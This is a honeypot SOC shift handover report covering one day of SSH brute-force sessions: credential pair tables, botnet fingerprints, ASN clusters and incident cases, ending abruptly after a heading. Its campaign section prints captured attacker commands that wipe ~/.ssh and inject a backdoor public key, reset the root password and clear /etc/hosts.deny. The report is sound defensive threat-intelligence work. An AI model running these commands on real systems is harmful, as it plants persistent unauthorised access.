# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-09 |
| **Generated At** | 2026-07-09T15:19:00Z |
| **Shift Time** | 15:19 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **444** |
| Confirmed Threats | **418** |
| False Positives Filtered | **26** (5.9%) |
| Unique Attacker IPs | **158** |
| Countries of Origin | **41** |
| High Severity Cases | **204** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **240** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **297** |
| Unique Credential Pairs | **164** |
| Unique Usernames | **52** |
| Unique Passwords | **120** |
| Successful Auth Pairs | **239** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 90 |
| `support` | 38 |
| `admin` | 25 |
| `guest` | 21 |
| `developer` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 27 |
| `123456` | 13 |
| `admin` | 12 |
| `` | 8 |
| `345gs5662d34` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 27 |
| `admin` | `admin` | 8 |
| `root` | `` | 8 |
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `smo@@kkklss` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root77` | `65.20.217.64` | 2026-07-09T10:55:08 |
| `root` | `root77` | `68.7.114.69` | 2026-07-09T10:55:15 |
| `root` | `root77` | `10.0.0.73` | 2026-07-09T10:55:33 |
| `support` | `support` | `176.53.159.196` | 2026-07-09T10:58:07 |
| `yuanzhecai` | `yuanzhecai` | `45.198.224.120` | 2026-07-09T10:58:40 |
| `support` | `support` | `10.0.0.73` | 2026-07-09T10:59:29 |
| `default` | `toor` | `90.173.78.90` | 2026-07-09T11:00:55 |
| `default` | `toor` | `211.252.94.151` | 2026-07-09T11:01:10 |
| `root` | `qazzxc66245` | `45.198.224.120` | 2026-07-09T11:09:18 |
| `postgres` | `postgres123` | `10.0.0.73` | 2026-07-09T11:10:08 |
| `guest` | `raspberry` | `116.48.143.166` | 2026-07-09T11:10:24 |
| `default` | `marketing` | `45.178.227.0` | 2026-07-09T11:12:11 |
| `guest` | `raspberry` | `220.134.25.203` | 2026-07-09T11:13:52 |
| `default` | `marketing` | `190.117.96.174` | 2026-07-09T11:15:41 |
| `default` | `marketing` | `183.233.85.194` | 2026-07-09T11:15:55 |
| `postgres` | `postgres123` | `45.198.224.114` | 2026-07-09T11:17:03 |
| `guest` | `159753` | `85.30.248.213` | 2026-07-09T11:17:26 |
| `guest` | `159753` | `103.174.80.40` | 2026-07-09T11:17:34 |
| `root` | `7777777` | `45.198.224.120` | 2026-07-09T11:20:11 |
| `guest` | `159753` | `10.0.0.73` | 2026-07-09T11:21:12 |
| `user` | `user123456789` | `200.126.105.149` | 2026-07-09T11:26:13 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-09T11:26:19 |
| `user` | `user123456789` | `46.101.9.55` | 2026-07-09T11:26:30 |
| `user` | `user123456789` | `10.0.0.73` | 2026-07-09T11:26:35 |
| `tcagame` | `tcagame` | `45.198.224.114` | 2026-07-09T11:27:40 |
| `jinkyu` | `1234` | `2.58.172.185` | 2026-07-09T11:30:10 |
| `root` | `Bangbang123` | `45.198.224.120` | 2026-07-09T11:30:52 |
| `admin` | `admin` | `132.243.24.82` | 2026-07-09T11:31:21 |
| `lockthisdown` | `lockthisdown` | `10.0.0.73` | 2026-07-09T11:31:21 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-09T11:31:22 |
| `admin` | `admin` | `27.154.225.118` | 2026-07-09T11:31:29 |
| `guest` | `marketing` | `78.187.9.111` | 2026-07-09T11:36:00 |
| `guest` | `marketing` | `200.222.71.218` | 2026-07-09T11:39:37 |
| `guest` | `marketing` | `138.219.13.21` | 2026-07-09T11:39:49 |
| `default` | `1q2w3e4r` | `196.188.93.169` | 2026-07-09T11:41:10 |
| `root` | `qwe#@!` | `45.198.224.120` | 2026-07-09T11:41:32 |
| `root` | `qwer@1234` | `180.94.74.94` | 2026-07-09T11:46:20 |
| `root` | `qwer@1234` | `196.189.124.229` | 2026-07-09T11:46:28 |
| `root` | `qwer@1234` | `10.0.0.73` | 2026-07-09T11:46:52 |
| `support` | `Support444` | `196.189.126.185` | 2026-07-09T11:47:30 |
| `support` | `Support444` | `45.118.136.243` | 2026-07-09T11:47:39 |
| `tomcat7` | `tomcat7` | `45.198.224.114` | 2026-07-09T11:48:47 |
| `support` | `Support444` | `10.0.0.73` | 2026-07-09T11:51:19 |
| `root` | `1qaz2wsx3edc4rfv` | `45.198.224.120` | 2026-07-09T11:52:19 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-09T11:58:00 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-09T11:58:00 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-09T11:58:06 |
| `23` | `root` | `94.154.43.140` | 2026-07-09T11:58:46 |
| `humbba` | `humbba` | `45.198.224.114` | 2026-07-09T11:59:30 |
| `root` | `101010` | `45.198.224.120` | 2026-07-09T12:03:09 |
| `www-data` | `password123` | `10.0.0.73` | 2026-07-09T12:03:13 |
| `root` | `aA123456` | `10.0.0.73` | 2026-07-09T12:05:46 |
| `root` | `compass` | `186.235.193.170` | 2026-07-09T12:07:09 |
| `root` | `compass` | `94.205.250.78` | 2026-07-09T12:07:17 |
| `www-data` | `password123` | `45.198.224.114` | 2026-07-09T12:10:07 |
| `Robert` | `robert123` | `45.198.224.120` | 2026-07-09T12:11:50 |
| `unknown` | `222` | `10.0.0.73` | 2026-07-09T12:12:36 |
| `unknown` | `999999` | `60.214.127.246` | 2026-07-09T12:12:50 |
| `vyos` | `vyos` | `164.92.228.62` | 2026-07-09T12:12:51 |
| `unknown` | `999999` | `117.211.15.106` | 2026-07-09T12:13:00 |
| `techuser4` | `techuser4` | `10.0.0.73` | 2026-07-09T12:13:54 |
| `root` | `eve` | `164.92.228.62` | 2026-07-09T12:15:18 |
| `root` | `111111` | `92.118.39.14` | 2026-07-09T12:15:36 |
| `unknown` | `999999` | `123.52.202.92` | 2026-07-09T12:16:23 |
| `root` | `123456a??` | `10.0.0.73` | 2026-07-09T12:16:41 |
| `unknown` | `999999` | `10.0.0.73` | 2026-07-09T12:16:49 |
| `gns3` | `gns3` | `164.92.228.62` | 2026-07-09T12:17:42 |
| `root` | `123123` | `92.118.39.14` | 2026-07-09T12:17:52 |
| `root` | `1234` | `92.118.39.14` | 2026-07-09T12:20:09 |
| `forge` | `forge` | `164.92.228.62` | 2026-07-09T12:20:13 |
| `root` | `Aa112233..` | `10.0.0.73` | 2026-07-09T12:20:22 |
| `techuser4` | `techuser4` | `45.198.224.114` | 2026-07-09T12:20:46 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-09T12:20:57 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-09T12:20:57 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-09T12:21:01 |
| `root` | `12345` | `92.118.39.14` | 2026-07-09T12:22:26 |
| `root` | `A100s200` | `206.167.33.157` | 2026-07-09T12:24:10 |
| `app` | `123456` | `10.0.0.73` | 2026-07-09T12:24:31 |
| `readarr` | `readarr` | `10.0.0.73` | 2026-07-09T12:26:46 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-09T12:26:50 |
| `readarr` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T12:26:52 |
| `root` | `12345678` | `92.118.39.14` | 2026-07-09T12:26:58 |
| `ubuntu` | `1qaz!QAZ` | `10.0.0.73` | 2026-07-09T12:27:36 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T12:27:42 |
| `root` | `123456789` | `92.118.39.14` | 2026-07-09T12:29:07 |
| `uucp` | `uucp` | `45.198.224.120` | 2026-07-09T12:29:27 |
| `root` | `admin123` | `106.89.59.26` | 2026-07-09T12:31:05 |
| `root` | `Password1` | `92.118.39.14` | 2026-07-09T12:31:20 |
| `app` | `123456` | `45.198.224.114` | 2026-07-09T12:31:29 |
| `supervisor` | `1q2w3e4r` | `80.233.12.109` | 2026-07-09T12:32:37 |
| `supervisor` | `1q2w3e4r` | `10.0.0.73` | 2026-07-09T12:33:05 |
| `root` | `admin` | `92.118.39.14` | 2026-07-09T12:33:32 |
| `pi` | `bananapi` | `157.7.200.152` | 2026-07-09T12:34:16 |
| `pi` | `bananapi` | `218.155.106.83` | 2026-07-09T12:34:25 |
| `root` | `0077` | `10.0.0.73` | 2026-07-09T12:34:37 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T12:34:43 |
| `dovecot` | `123456` | `10.0.0.73` | 2026-07-09T12:35:10 |
| `happytugsbakery` | `Happytugsbakery94` | `10.0.0.73` | 2026-07-09T12:35:22 |
| `celladmin` | `elastic` | `10.0.0.73` | 2026-07-09T12:35:31 |
| `admin` | `12345678` | `10.0.0.73` | 2026-07-09T12:35:41 |
| `root` | `admin123` | `92.118.39.14` | 2026-07-09T12:35:47 |
| `root` | `fa` | `10.0.0.73` | 2026-07-09T12:35:50 |
| `root` | `2wsx#EDC` | `10.0.0.73` | 2026-07-09T12:36:01 |
| `root` | `admin` | `10.0.0.73` | 2026-07-09T12:36:11 |
| `root` | `password` | `10.0.0.73` | 2026-07-09T12:36:21 |
| `customer` | `customer` | `10.0.0.73` | 2026-07-09T12:36:31 |
| `root` | `master123` | `107.135.117.245` | 2026-07-09T12:37:50 |
| `root` | `default` | `92.118.39.14` | 2026-07-09T12:38:02 |
| `pi` | `bananapi` | `10.0.0.73` | 2026-07-09T12:38:14 |
| `root` | `letmein` | `92.118.39.14` | 2026-07-09T12:40:19 |
| `root` | `master123` | `82.193.122.91` | 2026-07-09T12:41:20 |
| `root` | `master123` | `10.0.0.73` | 2026-07-09T12:41:38 |
| `desliga` | `desliga` | `185.225.41.192` | 2026-07-09T12:41:48 |
| `345gs5662d34` | `345gs5662d34` | `185.225.41.192` | 2026-07-09T12:41:51 |
| `desliga` | `3245gs5662d34` | `185.225.41.192` | 2026-07-09T12:41:53 |
| `opendnssec` | `opendnssec` | `45.198.224.114` | 2026-07-09T12:42:04 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-07-09T12:42:33 |
| `root` | `password` | `92.118.39.14` | 2026-07-09T12:44:51 |
| `root` | `qwerty` | `92.118.39.14` | 2026-07-09T12:47:12 |
| `root` | `system` | `92.118.39.14` | 2026-07-09T12:51:49 |
| `root` | `abcd123` | `112.27.38.203` | 2026-07-09T12:53:11 |
| `root` | `toor` | `92.118.39.14` | 2026-07-09T12:54:02 |
| `operator` | `pass` | `203.92.36.109` | 2026-07-09T12:54:53 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-09T12:55:56 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-09T12:55:57 |
| `admin` | `111111` | `92.118.39.14` | 2026-07-09T12:56:24 |
| `root` | `abcd123` | `220.132.170.64` | 2026-07-09T12:56:43 |
| `root` | `abcd123` | `190.12.109.162` | 2026-07-09T12:56:53 |
| `root` | `abcd123` | `10.0.0.73` | 2026-07-09T12:57:08 |
| `admin` | `123123` | `92.118.39.14` | 2026-07-09T12:58:44 |
| `root` | `7654321` | `61.2.44.54` | 2026-07-09T12:59:56 |
| `admin` | `1234` | `92.118.39.14` | 2026-07-09T13:01:02 |
| `root` | `qweasdqwe123` | `45.198.224.120` | 2026-07-09T13:02:55 |
| `oracle` | `123456` | `14.29.204.161` | 2026-07-09T13:03:11 |
| `oracle` | `123456` | `85.30.248.213` | 2026-07-09T13:03:20 |
| `ghost` | `ghost` | `45.198.224.114` | 2026-07-09T13:03:23 |
| `admin` | `12345` | `92.118.39.14` | 2026-07-09T13:03:24 |
| `admin` | `123456` | `92.118.39.14` | 2026-07-09T13:05:38 |
| `oracle` | `123456` | `111.70.32.8` | 2026-07-09T13:07:04 |
| `root` | `admin!@#` | `10.0.0.73` | 2026-07-09T13:07:06 |
| `oracle` | `123456` | `2.229.200.226` | 2026-07-09T13:07:11 |
| `oracle` | `123456` | `10.0.0.73` | 2026-07-09T13:07:25 |
| `admin` | `12345678` | `92.118.39.14` | 2026-07-09T13:07:51 |
| `admin` | `123456789` | `92.118.39.14` | 2026-07-09T13:10:08 |
| `admin` | `Administrator` | `92.118.39.14` | 2026-07-09T13:12:23 |
| `root` | `webadmin` | `45.198.224.120` | 2026-07-09T13:13:27 |
| `root` | `admin!@#` | `45.198.224.114` | 2026-07-09T13:13:59 |
| `admin` | `access` | `92.118.39.14` | 2026-07-09T13:14:35 |
| `admin` | `admin` | `92.118.39.14` | 2026-07-09T13:16:57 |
| `unknown` | `Password` | `121.128.84.224` | 2026-07-09T13:18:54 |
| `unknown` | `Password` | `122.160.142.194` | 2026-07-09T13:19:02 |
| `admin` | `admin123` | `92.118.39.14` | 2026-07-09T13:19:25 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-09T13:21:13 |
| `admin` | `adminadmin` | `92.118.39.14` | 2026-07-09T13:21:41 |
| `unknown` | `Password` | `177.72.87.7` | 2026-07-09T13:22:37 |
| `admin` | `letmein` | `92.118.39.14` | 2026-07-09T13:23:53 |
| `support` | `support1234567` | `10.0.0.73` | 2026-07-09T13:24:21 |
| `oracle` | `1qaz2wsx` | `45.198.224.120` | 2026-07-09T13:24:25 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-09T13:25:14 |
| `guest` | `P@ssword` | `110.164.201.73` | 2026-07-09T13:25:31 |
| `admin` | `passw0rd` | `92.118.39.14` | 2026-07-09T13:26:05 |
| `admin` | `password` | `92.118.39.14` | 2026-07-09T13:28:17 |
| `guest` | `P@ssword` | `206.0.8.204` | 2026-07-09T13:29:10 |
| `guest` | `P@ssword` | `102.90.34.90` | 2026-07-09T13:29:26 |
| `guest` | `P@ssword` | `10.0.0.73` | 2026-07-09T13:29:36 |
| `admin` | `password1` | `92.118.39.14` | 2026-07-09T13:30:30 |
| `guest` | `alpine` | `203.193.137.250` | 2026-07-09T13:30:50 |
| `admin` | `qwerty` | `92.118.39.14` | 2026-07-09T13:32:36 |
| `apache` | `1234` | `92.118.39.14` | 2026-07-09T13:34:46 |
| `ubuntu` | `rootadmin` | `45.198.224.120` | 2026-07-09T13:35:14 |
| `apache` | `12345678` | `92.118.39.14` | 2026-07-09T13:36:51 |
| `apache` | `admin` | `92.118.39.14` | 2026-07-09T13:38:54 |
| `apache` | `apache` | `92.118.39.14` | 2026-07-09T13:40:59 |
| `apache` | `password` | `92.118.39.14` | 2026-07-09T13:43:08 |
| `guest` | `toor` | `218.202.143.68` | 2026-07-09T13:44:54 |
| `backup` | `123` | `92.118.39.14` | 2026-07-09T13:45:19 |
| `root` | `qqq` | `45.198.224.120` | 2026-07-09T13:46:02 |
| `support` | `asdf1234` | `179.184.85.167` | 2026-07-09T13:46:31 |
| `support` | `asdf1234` | `37.28.177.141` | 2026-07-09T13:46:38 |
| `backup` | `12345678` | `92.118.39.14` | 2026-07-09T13:47:32 |
| `guest` | `toor` | `10.0.0.73` | 2026-07-09T13:48:55 |
| `backup` | `password` | `92.118.39.14` | 2026-07-09T13:49:49 |
| `developer` | `1` | `92.118.39.14` | 2026-07-09T13:51:54 |
| `developer` | `123` | `92.118.39.14` | 2026-07-09T13:54:02 |
| `ubnt` | `ubntubnt` | `113.140.95.250` | 2026-07-09T13:55:03 |
| `ubnt` | `ubntubnt` | `138.118.215.192` | 2026-07-09T13:55:12 |
| `developer` | `1234` | `92.118.39.14` | 2026-07-09T13:56:12 |
| `mary` | `mary` | `45.198.224.114` | 2026-07-09T13:56:44 |
| `postgres` | `QwErTy` | `45.198.224.120` | 2026-07-09T13:56:58 |
| `developer` | `12345` | `92.118.39.14` | 2026-07-09T13:58:21 |
| `support` | `123456789a` | `10.0.0.73` | 2026-07-09T13:59:06 |
| `james` | `james` | `10.0.0.73` | 2026-07-09T14:00:27 |
| `developer` | `123456` | `92.118.39.14` | 2026-07-09T14:00:33 |
| `developer` | `1234567` | `92.118.39.14` | 2026-07-09T14:02:41 |
| `fad` | `fad123` | `10.0.0.73` | 2026-07-09T14:03:14 |
| `fad` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T14:03:18 |
| `developer` | `12345678` | `92.118.39.14` | 2026-07-09T14:04:47 |
| `root` | `sshd` | `210.212.136.3` | 2026-07-09T14:05:07 |
| `345gs5662d34` | `345gs5662d34` | `210.212.136.3` | 2026-07-09T14:05:11 |
| `root` | `3245gs5662d34` | `210.212.136.3` | 2026-07-09T14:05:12 |
| `developer` | `123456789` | `92.118.39.14` | 2026-07-09T14:06:52 |
| `james` | `james` | `45.198.224.114` | 2026-07-09T14:07:45 |
| `jack` | `jack123` | `45.198.224.120` | 2026-07-09T14:08:01 |
| `developer` | `1234567890` | `92.118.39.14` | 2026-07-09T14:08:58 |
| `developer` | `abc123` | `92.118.39.14` | 2026-07-09T14:11:02 |
| `test` | `test12` | `112.120.115.152` | 2026-07-09T14:12:21 |
| `developer` | `password` | `92.118.39.14` | 2026-07-09T14:13:07 |
| `root` | `root1234567890` | `223.99.212.58` | 2026-07-09T14:14:23 |
| `root` | `root1234567890` | `195.222.57.183` | 2026-07-09T14:14:37 |
| `root` | `root1234567890` | `10.0.0.73` | 2026-07-09T14:14:41 |
| `developer` | `qwerty` | `92.118.39.14` | 2026-07-09T14:15:16 |
| `test` | `test12` | `10.0.0.73` | 2026-07-09T14:16:24 |
| `docker` | `123` | `92.118.39.14` | 2026-07-09T14:17:28 |
| `root` | `admin` | `45.198.224.120` | 2026-07-09T14:19:32 |
| `docker` | `123456` | `92.118.39.14` | 2026-07-09T14:19:36 |
| `support` | `support88` | `10.0.0.73` | 2026-07-09T14:21:25 |
| `ubnt` | `ubnt` | `121.202.138.181` | 2026-07-09T14:21:52 |
| `ubnt` | `ubnt` | `111.70.32.6` | 2026-07-09T14:22:01 |
| `ubnt` | `ubnt` | `101.13.0.53` | 2026-07-09T14:25:28 |
| `ubnt` | `ubnt` | `65.20.138.3` | 2026-07-09T14:25:41 |
| `ubnt` | `ubnt` | `10.0.0.73` | 2026-07-09T14:25:51 |
| `mongod` | `mongod` | `45.198.224.114` | 2026-07-09T14:29:15 |
| `ubuntu` | `q1w2e3r4t5y` | `45.198.224.120` | 2026-07-09T14:30:51 |
| `mg3500` | `merlin` | `10.0.0.73` | 2026-07-09T14:32:55 |
| `guest` | `admin123` | `178.178.222.58` | 2026-07-09T14:38:07 |
| `supervisor` | `webmaster` | `49.206.194.29` | 2026-07-09T14:40:24 |
| `supervisor` | `webmaster` | `10.0.0.73` | 2026-07-09T14:40:42 |
| `root` | `qwe123asd` | `45.198.224.120` | 2026-07-09T14:41:56 |
| `guest` | `admin123` | `10.0.0.73` | 2026-07-09T14:41:58 |
| `supervisor` | `123` | `187.49.63.41` | 2026-07-09T14:46:58 |
| `supervisor` | `123` | `65.20.141.202` | 2026-07-09T14:47:06 |
| `steam` | `steam` | `45.198.224.114` | 2026-07-09T14:50:23 |
| `supervisor` | `123` | `10.0.0.73` | 2026-07-09T14:50:38 |
| `tomcat` | `abcd1234` | `10.0.0.73` | 2026-07-09T14:50:40 |
| `root` | `142536789` | `186.251.71.202` | 2026-07-09T14:52:44 |
| `345gs5662d34` | `345gs5662d34` | `186.251.71.202` | 2026-07-09T14:52:47 |
| `root` | `3245gs5662d34` | `186.251.71.202` | 2026-07-09T14:52:48 |
| `root` | `9876543210` | `45.198.224.120` | 2026-07-09T14:53:27 |
| `tunnel` | `tunnel` | `10.0.0.73` | 2026-07-09T14:54:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **444** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 122 |
| OpenSSH | 67 |
| libssh | 34 |
| Paramiko (Python) | 14 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 65 | 64 |
| `2ec37a7cc8da...` | Mirai/variant | 57 | 1 |
| `16443846184e...` | Generic scanner | 39 | 4 |
| `eff4c24daffc...` | Modern SSH client | 14 | 1 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 65 | 64 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 57 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 39 | 4 | Generic scanner |
| `95420f9d932d...` | libssh | 18 | 5 | — |
| `eff4c24daffc...` | Go SSH scanner | 14 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 8 | 4 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 55 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:9rqSflbmBBw7"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `206.167.33.157`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.225.41.192`, `186.251.71.202`, `210.212.136.3`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **158** |
| Unique ASNs | **88** |
| High-Risk ASNs | **82** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 16 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 9 | HIGH |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (204)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ddf732fdbb33

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-09 10:55 |
| **Last Seen** | 2026-07-09 10:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:55:06` | `cowrie.session.connect` |
| `2026-07-09 10:55:06` | `cowrie.client.version` |
| `2026-07-09 10:55:06` | `cowrie.client.kex` |
| `2026-07-09 10:55:08` | `cowrie.login.success` |
| `2026-07-09 10:55:08` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c547119b4d0e

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-07-09 10:55 |
| **Last Seen** | 2026-07-09 10:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:55:13` | `cowrie.session.connect` |
| `2026-07-09 10:55:14` | `cowrie.client.version` |
| `2026-07-09 10:55:14` | `cowrie.client.kex` |
| `2026-07-09 10:55:15` | `cowrie.login.success` |
| `2026-07-09 10:55:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615e00728a5c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 10:58 |
| **Last Seen** | 2026-07-09 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 10:58:07` | `cowrie.session.connect` |
| `2026-07-09 10:58:07` | `cowrie.client.version` |
| `2026-07-09 10:58:07` | `cowrie.client.kex` |
| `2026-07-09 10:58:07` | `cowrie.login.success` |
| `2026-07-09 10:58:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 10:58:08` | `cowrie.direct-tcpip.data` |
| `2026-07-09 10:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
